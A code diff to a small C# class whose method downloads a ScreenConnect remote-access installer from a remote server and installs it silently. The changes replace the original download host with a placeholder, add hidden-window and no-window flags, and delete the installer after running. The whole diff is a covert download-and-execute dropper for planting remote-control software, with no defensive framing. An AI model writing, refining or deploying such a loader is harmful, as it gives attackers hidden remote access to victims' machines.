@@ -6,14 +6,28 @@ public class H
 {
     public static void Exec()
     {
-        string url = "https://q3x.xyz/Bin/ScreenConnect.ClientSetup.msi";
+        // === CHANGE THIS URL TO YOUR REAL SCREENCONNECT MSI ===
+        string url = "https://your-server.com/ScreenConnect.ClientSetup.msi";
         string path = @"C:\Windows\Temp\sc.msi";
+
+        // Download
         using (WebClient wc = new WebClient())
         {
             wc.DownloadFile(url, path);
         }
-        Process p = Process.Start("msiexec.exe", "/i \"" + path + "\" /quiet /qn");
+
+        // Silent install
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = "msiexec.exe",
+            Arguments = "/i \"" + path + "\" /quiet /qn",
+            WindowStyle = ProcessWindowStyle.Hidden,
+            CreateNoWindow = true
+        };
+        Process p = Process.Start(psi);
         p.WaitForExit();
+
+        // Cleanup
         System.IO.File.Delete(path);
     }
 }
